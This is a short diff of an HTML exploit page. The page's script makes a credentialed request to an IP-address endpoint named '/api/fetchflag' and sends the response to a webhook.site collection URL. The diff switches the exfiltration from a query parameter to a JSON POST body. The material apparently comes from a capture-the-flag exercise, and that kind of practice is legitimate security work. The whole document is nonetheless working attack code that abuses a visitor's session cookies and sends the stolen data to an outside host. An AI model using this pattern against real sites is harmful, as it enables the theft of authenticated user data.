@@ -3,9 +3,13 @@
 <body>
 <script>
 fetch("http://95.217.6.37:20001/api/fetchflag", { credentials: "include" })
-  .then(r => r.text())
+  .then(r => r.json())
   .then(data => {
-    fetch("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f?data=" + encodeURIComponent(data));
+    fetch("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
   });
 </script>
 </body>
